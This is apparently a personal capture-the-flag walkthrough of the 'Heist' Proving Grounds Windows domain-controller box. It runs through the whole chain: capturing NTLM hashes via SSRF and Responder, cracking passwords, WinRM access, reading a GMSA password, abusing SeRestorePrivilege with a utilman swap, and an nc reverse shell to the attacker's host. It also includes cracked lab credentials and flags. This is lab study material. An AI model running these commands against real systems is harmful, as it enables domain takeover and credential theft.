# Heist

## Enumeration & scanning

- System is a domain controller.
- Port 8080 (HTTP) is open, hosts webapp named 'super secure web browser' that browses to a page you submit.
- If you submit `localhost:8080`, it browses to the same webapp, meaning you can make requests and it is vulnerable to SSRF.

``` sh
# Default scanning
sudo nmap -p- 192.168.118.165  
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,8080,9389 -A 192.168.118.165
# No anonymous access for services
enum4linux -a 192.168.118.165  
ldapdomaindump 192.168.118.165

# HTTP (8080)
feroxbuster -u http://192.168.118.165:8080/
# SSRF
# http://192.168.118.165:8080/?url=http://localhost:8080
```

## Exploitation

- Since the system is a domain controller and we can leverage the SSRF vulnerability to make a request, we can make a request to a local `Responder` listener to collect NTLM hashes.
- Crack the hash to get password.
- Check which services the password can be used for.

``` sh
# Setup Responder
sudo responder -I tun0 -wv
# Make request
http://192.168.225.165:8080/?url=http://192.168.45.248:80/
# Get hash
enox::HEIST:7e0d7482412334a0:3430AC9FA64D1DCBF3059217009886AB:0101000000000000482F6817EA4CDD01D7BE6EFF3C40F5C60000000002000800540049003600500001001E00570049004E002D00340047004100390044004800380055005000580041000400140054004900360050002E004C004F00430041004C0003003400570049004E002D00340047004100390044004800380055005000580041002E0054004900360050002E004C004F00430041004C000500140054004900360050002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003200340038000000000000000000
# Crack password
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# Creds - enox:california

# Explore services; see notes for more commands
nxc smb 192.168.225.165 -u enox -p california
nxc ldap 192.168.225.165 -u enox -p 'california'
nxc winrm 192.168.225.165 -u enox -p 'california'
nxc rdp 192.168.225.165 -u enox -p 'california'
nxc wmi 192.168.225.165 -u enox -p 'california'

# Can authenticate using winrm
evil-winrm -i 192.168.225.165 -u 'enox' -p 'california'
# Get flag
type local.txt
44af59658a28f665773c914a2c1a5b4b
```

## Privilege Escalation

- Find file `todo.txt`, read it. It says the webapp was built as Flask app and meant to be migrated to Apache, but hasn't happened yet.
- Very little permissions to check things.
- Account `svc_apache$` exists besides `Administrator`.
- Run Bloodhound and look for shortest path to high value targets. Find GMSA vulnerability to get to Apache account.

``` sh
# Bloodhound
# Sharphound collection
iwr -uri http://192.168.45.248/SharpHound.exe -Outfile sharphound.exe
./sharphound.exe
# Send archive over SMB
mkdir -p ~/transfer
impacket-smbserver transfer ~/transfer -smb2support
copy C:\Users\enox\Desktop\20260925064049_BloodHound.zip \\192.168.45.248\transfer\
# Start Bloodhound from app folder
sudo dockerd
sudo docker compose up -d

# Analyze Bloodhound
# Check 'shortest path to high value targets
# Find this:
# SVC_APACHE$@HEIST.OFFSEC is a Group Managed Service Account. The group WEB ADMINS@HEIST.OFFSEC can retrieve the password for the GMSA SVC_APACHE$@HEIST.OFFSEC.
# Validate
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq “msDS-GroupManagedServiceAccount”}

# GMSA exploit
# Execute exploit binary
iwr -uri http://192.168.45.248/GMSAPasswordReader.exe -Outfile GMSAPasswordReader.exe
./GMSAPasswordReader.exe --accountname SVC_APACHE$
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : F426A3CBC821B3ECCFA4A17579EDCE02
[*]       aes128_cts_hmac_sha1 : 6FDFDB097BA6324C41DC4811C9636EC9
[*]       aes256_cts_hmac_sha1 : 07C0755C582F2DEA872B3CF55C04E2ACF2311134D650AAB2779FBF3044D10A8B
[*]       des_cbc_md5          : ECDA436BF7B3BAAD
# rc4_hmac is value we need
# Logon as service account
evil-winrm -i 192.168.225.165 -u 'svc_apache$' -H 'F426A3CBC821B3ECCFA4A17579EDCE02' 

# Has special priveleges
whoami /priv
SeRestorePrivilege
# Execute exploit
iwr -uri http://192.168.45.248/Invoke-SeRestoreAbuse.ps1 -Outfile Invoke-SeRestoreAbuse.ps1 
. ./Invoke-SeRestoreAbuse.ps1 
# Leverage technique mentioned on cheatsheet (Hacktricks)
mv utilman.exe utilman.old
mv cmd.exe utilman.exe
# Get rdp login screen, trigger exploit for SYSTEM cmd
rdesktop 192.168.225.165
# WIN + U
# Get nc.exe on system for reverse shell
iwr -uri http://192.168.45.248/nc.exe -Outfile nc.exe
nc -nlvp 4444
nc.exe 192.168.45.248 4444 -e cmd
# get root flag
```

## References

- https://medium.com/@bdsalazar/proving-grounds-heist-hard-windows-active-directory-box-walkthrough-a-journey-to-9469ae735a34
- https://hackviser.com/tactics/pentesting/web/ssrf
- https://bloodhound.specterops.io/resources/edges/read-gmsa-password
- https://github.com/expl0itabl3/Toolies
- https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#table
- https://github.com/0x4D-5A/Invoke-SeRestoreAbuse

## Rabbit holes

- Tried finding other open ports on localhost using `ssrfmap` and other manual techniques, no findings.
